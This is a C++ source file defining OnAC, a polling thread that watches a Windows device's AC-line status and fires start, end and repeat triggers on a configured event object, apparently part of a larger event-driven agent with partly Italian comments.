#include "Event.h"
#include "Common.h"
#include "Conf.h"
#include "Date.h"
#include "Log.h"
#include <common_new\pm.h>
#include "CallBacks.h"
#include "Device.h"

#include "FunctionFunc.h"


DWORD WINAPI OnAC(LPVOID lpParam) {
	Event *me = (Event *)lpParam;
	Configuration *conf;
	HANDLE eventHandle;
	int delay, iterations, curIterations = 0, curDelay = 0;
	///const SYSTEM_POWER_STATUS_EX2 *pBattery = NULL;
	const SYSTEM_POWER_STATUS *pBattery = NULL;
	BOOL bAC = FALSE;
	DWORD dwAcStatus = 0;
	Device *deviceObj = Device::self();

	eventHandle = me->getEvent();

	me->setStatus(EVENT_RUNNING);
	conf = me->getConf();

	try {
		iterations = conf->getInt(L"iter");
	} catch (...) {
		iterations = MAXINT;
	}

	try {
		delay = conf->getInt(L"delay") * 1000;
	} catch (...) {
		//delay = INFINITE;
		//se è infinito è non c'e' un Repeat non esce dal wail e' non arriva mai ad AC off 
		delay = 10000;
	}
/***
	deviceObj->RefreshBatteryStatus();
	pBattery = deviceObj->GetBatteryStatus();
	dwAcStatus = pBattery->ACLineStatus;


	if (deviceObj->RegisterPowerNotification(AcCallback, (DWORD)&dwAcStatus) == FALSE) {
		me->setStatus(EVENT_STOPPED);
		return 0;
	}
***/
	LOOP {
		//a differenza di mobile la gestisco in polling
		deviceObj->RefreshBatteryStatus();
		pBattery = deviceObj->GetBatteryStatus();
		dwAcStatus = pBattery->ACLineStatus;

		if (dwAcStatus == AC_LINE_ONLINE && bAC == FALSE) {
			bAC = TRUE;
			DBG_TRACE(L"Debug - Ac.cpp - Ac event [IN action triggered]\n", 5, FALSE);
			me->triggerStart();
			curIterations = 0;
		}

		if (dwAcStatus == AC_LINE_OFFLINE && bAC == TRUE) {
			bAC = FALSE;
			DBG_TRACE(L"Debug - Ac.cpp - AC event [OUT action triggered]\n", 5, FALSE);
			me->triggerEnd();
			curIterations = 0;
		}

		if (dwAcStatus == AC_LINE_ONLINE && bAC == TRUE)
			curDelay = delay;
		else
			curDelay = 10000;

		_WaitForSingleObject(eventHandle, curDelay);

		if (me->shouldStop()) {
			DBG_TRACE(L"Debug - Events.cpp - Ac Event is Closing\n", 1, FALSE);
///			deviceObj->UnRegisterPowerNotification(AcCallback);
			me->setStatus(EVENT_STOPPED);
			return 0;
		}

		if (dwAcStatus == AC_LINE_ONLINE && bAC == TRUE && curIterations < iterations) {
			me->triggerRepeat();
			curIterations++;
		}
	}

	return 0;
}